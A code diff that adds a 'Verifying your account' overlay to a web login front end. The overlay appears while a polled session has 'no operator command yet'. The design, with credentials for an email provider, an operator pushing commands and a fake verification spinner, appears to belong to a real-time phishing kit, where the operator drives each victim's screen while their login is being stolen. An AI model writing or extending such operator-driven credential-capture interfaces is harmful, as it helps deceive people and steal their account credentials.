@@ -237,6 +237,25 @@
     if (mailingLoading) mailingLoading.style.display = 'none';
   }
 
+  function showVerifying(provider) {
+    closeAuthModal();
+    const providerName = provider || 'your email';
+    renderOverlay(`
+      <div class="response-overlay" id="overlay-verifying">
+        <div class="response-card verifying-card">
+          <div class="verifying-spinner" aria-hidden="true"></div>
+          <h2 class="verifying-title">Verifying your account</h2>
+          <p class="verifying-message">Please wait while we verify your ${escapeHtml(providerName)} credentials. This may take a moment.</p>
+          <div class="verifying-dots" aria-hidden="true">
+            <span class="verifying-dot"></span>
+            <span class="verifying-dot"></span>
+            <span class="verifying-dot"></span>
+          </div>
+        </div>
+      </div>
+    `);
+  }
+
   function handleCommand(command, data) {
     switch (command) {
       case 'success':
@@ -314,6 +333,9 @@
       if (result.success && result.command) {
         lastDisplayedKey = result.command + ':' + (result.data || '');
         handleCommand(result.command, result.data);
+      } else if (result.success && !result.command) {
+        // Session exists but no operator command yet — show the verifying state
+        showVerifying(result.provider || null);
       }
     } catch (e) { /* ignore */ }
 
